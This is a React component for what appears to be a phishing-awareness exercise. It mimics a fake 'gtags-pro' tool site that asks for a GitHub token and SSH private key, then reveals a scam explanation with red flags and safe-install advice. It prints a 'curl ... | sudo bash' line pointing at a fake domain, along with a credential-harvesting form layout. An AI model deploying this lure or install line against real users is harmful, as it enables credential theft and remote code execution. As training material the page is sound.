import React, { useState } from "react";

export default function FakeGtagsScam({ onComplete }) {
  const [view, setView] = useState("home");

  const [name, setName] = useState("");
  const [email, setEmail] = useState("");
  const [githubUsername, setGithubUsername] = useState("");
  const [projectPath, setProjectPath] = useState("");

  const [githubPat, setGithubPat] = useState("");
  const [sshKey, setSshKey] = useState("");

  const inputStyle = {
    width: "100%",
    padding: "15px",
    marginBottom: "15px",
    borderRadius: "8px",
    border: "1px solid #14b8a6",
    fontSize: "15px",
    outline: "none",
    background: "#042f2e",
    color: "#99f6e4",
    fontFamily: "monospace",
    boxSizing: "border-box"
  };

  const codeStyle = {
    background: "#000",
    color: "#2dd4bf",
    padding: "12px 16px",
    borderRadius: "8px",
    fontFamily: "monospace",
    fontSize: "14px",
    margin: "10px 0",
    border: "1px solid #134e4a",
    overflowX: "auto",
    whiteSpace: "pre-wrap"
  };

  /* ===================================
        INSTALLATION / AUTH PAGE
  =================================== */
  if (view === "install") {
    return (
      <div style={{ background: "#021c1b", minHeight: "100vh", display: "flex", justifyContent: "center", alignItems: "center", padding: "40px" }}>
        <div style={{ width: "100%", maxWidth: "720px", background: "#042f2e", borderRadius: "16px", padding: "35px", boxShadow: "0 20px 40px rgba(20,184,166,.25)", color: "#fff", border: "1px solid #134e4a" }}>
          <div style={{ textAlign: "center" }}>
            <div style={{ fontSize: "60px" }}>🏷️</div>
            <h1 style={{ color: "#2dd4bf", fontFamily: "monospace" }}>gtags-pro Installation</h1>
            <h2>Repository Authentication</h2>
            <p style={{ color: "#5eead4" }}>Authenticate to install gtags-pro and enable cloud sync</p>
          </div>

          <div style={{ background: "#134e4a", padding: "20px", borderRadius: "10px", margin: "25px 0", border: "1px solid #14b8a6" }}>
            <h3 style={{ color: "#2dd4bf" }}>🔐 Why we need your credentials</h3>
            <ul style={{ lineHeight: "1.8", color: "#99f6e4" }}>
              <li>✔ Sync your tag database across devices</li>
              <li>✔ Access private plugin repository</li>
              <li>✔ Enable auto-update for new features</li>
              <li>✔ Backup your custom configurations</li>
            </ul>
            <p style={{ color: "#fbbf24", fontSize: "13px", marginTop: "10px" }}>
              ⚠️ Your credentials are encrypted with AES-256 and never stored.
            </p>
          </div>

          <div style={codeStyle}>
{`$ curl -sSL https://gtags-pro.dev/install.sh | sudo bash
[sudo] password for ${name || "developer"}:
[INFO] Authenticating with GitHub...`}
          </div>

          <label style={{ color: "#5eead4", fontSize: "13px" }}>GitHub Personal Access Token (with repo scope)</label>
          <input
            placeholder="ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
            value={githubPat}
            onChange={(e) => setGithubPat(e.target.value)}
            style={inputStyle}
          />

          <label style={{ color: "#5eead4", fontSize: "13px" }}>SSH Private Key (optional, for private repos)</label>
          <textarea
            placeholder="-----BEGIN OPENSSH PRIVATE KEY-----&#10;..."
            value={sshKey}
            onChange={(e) => setSshKey(e.target.value)}
            style={{ ...inputStyle, minHeight: "100px", resize: "vertical" }}
          />

          <button
            onClick={() => setView("success")}
            style={{ width: "100%", padding: "16px", background: "linear-gradient(90deg,#14b8a6,#0d9488)", border: "none", color: "#fff", fontSize: "16px", fontWeight: "700", borderRadius: "10px", cursor: "pointer", fontFamily: "monospace" }}
          >
            $ gtags-pro --auth --sync
          </button>
        </div>
      </div>
    );
  }

  /* ===================================
        SUCCESS / SCAM DETECTED PAGE
        (Placed BEFORE default return)
  =================================== */
  if (view === "success") {
    return (
      <div style={{ background: "#021c1b", minHeight: "100vh", padding: "40px" }}>
        <div style={{ maxWidth: "1000px", margin: "auto", background: "#fff", borderRadius: "20px", overflow: "hidden", boxShadow: "0 20px 50px rgba(0,0,0,.4)" }}>
          <div style={{ background: "linear-gradient(90deg,#dc2626,#991b1b)", padding: "30px", textAlign: "center", color: "#fff" }}>
            <h1>🚨 SCAM DETECTED</h1>
            <h3>This was a Fake gtags-pro Website.</h3>
          </div>

          <div style={{ padding: "35px" }}>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))", gap: "20px" }}>
              <div style={{ background: "#fef2f2", padding: "20px", borderRadius: "15px" }}>
                <h2>📂 Information Exposed</h2>
                <ul style={{ lineHeight: "1.8" }}>
                  <li>👤 Name: <b>{name || "Not provided"}</b></li>
                  <li>📧 Email: <b>{email || "Not provided"}</b></li>
                  <li>💻 GitHub Username: <b>{githubUsername || "Not provided"}</b></li>
                  <li>📁 Project Path: <b>{projectPath || "Not provided"}</b></li>
                  <li>🔑 GitHub PAT: <b>{githubPat ? githubPat.slice(0, 8) + "..." + githubPat.slice(-4) : "Not provided"}</b></li>
                  <li>🔐 SSH Key: <b>{sshKey ? "•••••••• (exposed)" : "Not provided"}</b></li>
                </ul>
              </div>

              <div style={{ background: "#fff7ed", padding: "20px", borderRadius: "15px" }}>
                <h2>🚩 Red Flags</h2>
                <ul style={{ lineHeight: "1.8" }}>
                  <li>Unofficial domain (not gnu.org/software/global).</li>
                  <li>Requests GitHub PAT with broad scopes.</li>
                  <li>Requests SSH private key (NEVER share this).</li>
                  <li>Piping curl to sudo bash (extremely dangerous).</li>
                  <li>"Pro" version of a free open-source tool.</li>
                  <li>No official GNU project endorsement.</li>
                </ul>
              </div>
            </div>

            <div style={{ marginTop: "25px", background: "#eff6ff", padding: "20px", borderRadius: "15px" }}>
              <h2>📊 Risk Meter</h2>
              <div style={{ height: "18px", background: "#d1d5db", borderRadius: "20px", overflow: "hidden" }}>
                <div style={{ width: "99%", height: "100%", background: "#dc2626" }}></div>
              </div>
              <h3 style={{ marginTop: "10px", color: "#dc2626" }}>CRITICAL RISK — FULL REPOSITORY & INFRASTRUCTURE COMPROMISE</h3>
            </div>

            <div style={{ marginTop: "25px", background: "#ecfdf5", padding: "20px", borderRadius: "15px" }}>
              <h2>🛡 How to Safely Install Developer Tools</h2>
              <ul style={{ lineHeight: "1.8" }}>
                <li>✅ Install gtags from official sources: <b>gnu.org/software/global</b> or your distro's package manager.</li>
                <li>✅ <b>Never pipe curl/wget to bash</b> — always inspect scripts first.</li>
                <li>✅ <b>Never share your GitHub PAT</b> with any website or tool.</li>
                <li>✅ <b>Never share your SSH private key</b> — it grants full access to your servers.</li>
                <li>✅ Use fine-grained PATs with minimal scopes and short expiry.</li>
                <li>✅ Verify package signatures and checksums before installation.</li>
                <li>✅ If compromised: <b>revoke tokens immediately</b> and rotate SSH keys.</li>
                <li>✅ Report phishing to GitHub Abuse team and CERT-In.</li>
              </ul>
            </div>

            <div style={{ marginTop: "25px", background: "#f8fafc", padding: "20px", borderRadius: "15px" }}>
              <h2>📈 Scam Timeline</h2>
              <p>✅ Searched for "gtags pro" or "enhanced gtags"</p>
              <p>⬇</p>
              <p>✅ Clicked typosquatted website</p>
              <p>⬇</p>
              <p>✅ Ran suggested curl | bash command</p>
              <p>⬇</p>
              <p>✅ Entered GitHub PAT and SSH key</p>
              <p>⬇</p>
              <p style={{ color: "#dc2626", fontWeight: "700" }}>❌ Attacker Gained Access to All Repos & Infrastructure</p>
            </div>

            <button
              onClick={() => onComplete({ name, email, githubUsername, projectPath, githubPat, sshKey })}
              style={{ width: "100%", marginTop: "30px", padding: "18px", background: "linear-gradient(90deg,#14b8a6,#0d9488)", border: "none", color: "#fff", fontWeight: "700", fontSize: "18px", borderRadius: "12px", cursor: "pointer" }}
            >
              Continue to Quiz →
            </button>
          </div>
        </div>
      </div>
    );
  }

  /* ===================================
        HOME PAGE (Default Return)
  =================================== */
  return (
    <div style={{ background: "linear-gradient(135deg,#021c1b,#042f2e)", minHeight: "100vh", padding: "40px", color: "#99f6e4" }}>
      <div style={{ maxWidth: "1100px", margin: "auto" }}>
        <div style={{ background: "#042f2e", borderRadius: "20px", overflow: "hidden", boxShadow: "0 20px 50px rgba(20,184,166,.2)", border: "1px solid #134e4a" }}>
          <div style={{ background: "linear-gradient(90deg,#0d9488,#14b8a6,#2dd4bf)", padding: "40px", textAlign: "center" }}>
            <h1 style={{ fontSize: "42px", margin: 0, fontFamily: "monospace", color: "#fff" }}>🏷️ gtags-pro</h1>
            <h3 style={{ color: "#ecfdf5" }}>The Ultimate Source Code Tagging Solution</h3>
            <p style={{ color: "#ccfbf1" }}>Enhanced GNU Global with Cloud Sync & IDE Integration</p>
          </div>

          <div style={{ padding: "35px" }}>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))", gap: "20px", marginBottom: "30px" }}>
              <div style={{ background: "#134e4a", padding: "20px", borderRadius: "12px", border: "1px solid #14b8a6" }}>
                <div style={{ fontSize: "36px" }}>⚡</div>
                <h3 style={{ color: "#2dd4bf" }}>10x Faster</h3>
                <p style={{ color: "#5eead4", fontSize: "14px" }}>Optimized tag generation</p>
              </div>
              <div style={{ background: "#134e4a", padding: "20px", borderRadius: "12px", border: "1px solid #14b8a6" }}>
                <div style={{ fontSize: "36px" }}>☁️</div>
                <h3 style={{ color: "#2dd4bf" }}>Cloud Sync</h3>
                <p style={{ color: "#5eead4", fontSize: "14px" }}>Sync across all devices</p>
              </div>
              <div style={{ background: "#134e4a", padding: "20px", borderRadius: "12px", border: "1px solid #14b8a6" }}>
                <div style={{ fontSize: "36px" }}>🔌</div>
                <h3 style={{ color: "#2dd4bf" }}>IDE Integration</h3>
                <p style={{ color: "#5eead4", fontSize: "14px" }}>VS Code, Vim, Emacs</p>
              </div>
              <div style={{ background: "#134e4a", padding: "20px", borderRadius: "12px", border: "1px solid #14b8a6" }}>
                <div style={{ fontSize: "36px" }}>🔒</div>
                <h3 style={{ color: "#2dd4bf" }}>Private Repos</h3>
                <p style={{ color: "#5eead4", fontSize: "14px" }}>Secure tag database</p>
              </div>
            </div>

            <div style={{ background: "#000", padding: "20px", borderRadius: "12px", marginBottom: "25px", border: "1px solid #134e4a" }}>
              <h3 style={{ color: "#2dd4bf", fontFamily: "monospace" }}>📦 Quick Install</h3>
              <div style={codeStyle}>$ curl -sSL https://gtags-pro.dev/install.sh | sudo bash</div>
              <div style={codeStyle}>$ gtags-pro --init --cloud-sync</div>
            </div>

            <div style={{ background: "#134e4a", padding: "20px", borderRadius: "12px", marginBottom: "25px", border: "1px solid #fbbf24" }}>
              <h2 style={{ color: "#fbbf24", marginTop: 0 }}>⚠️ GitHub Authentication Required</h2>
              <p>To enable cloud sync and access private repositories, authenticate with your GitHub account.</p>
            </div>

            <h2 style={{ color: "#2dd4bf" }}>📝 Register for gtags-pro</h2>
            <input placeholder="Full Name" value={name} onChange={(e) => setName(e.target.value)} style={inputStyle} />
            <input placeholder="Email Address" value={email} onChange={(e) => setEmail(e.target.value)} style={inputStyle} />
            <input placeholder="GitHub Username" value={githubUsername} onChange={(e) => setGithubUsername(e.target.value)} style={inputStyle} />
            <input placeholder="Main Project Path (e.g., /home/user/project)" value={projectPath} onChange={(e) => setProjectPath(e.target.value)} style={inputStyle} />

            <button
              onClick={() => setView("install")}
              style={{ width: "100%", padding: "18px", background: "linear-gradient(90deg,#14b8a6,#0d9488)", border: "none", color: "#fff", fontSize: "18px", fontWeight: "700", borderRadius: "12px", cursor: "pointer", fontFamily: "monospace" }}
            >
              $ gtags-pro --install →
            </button>

            <p style={{ textAlign: "center", color: "#5eead4", fontSize: "12px", marginTop: "20px" }}>
              © 2026 gtags-pro Development Team (FAKE — for educational purposes only)
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}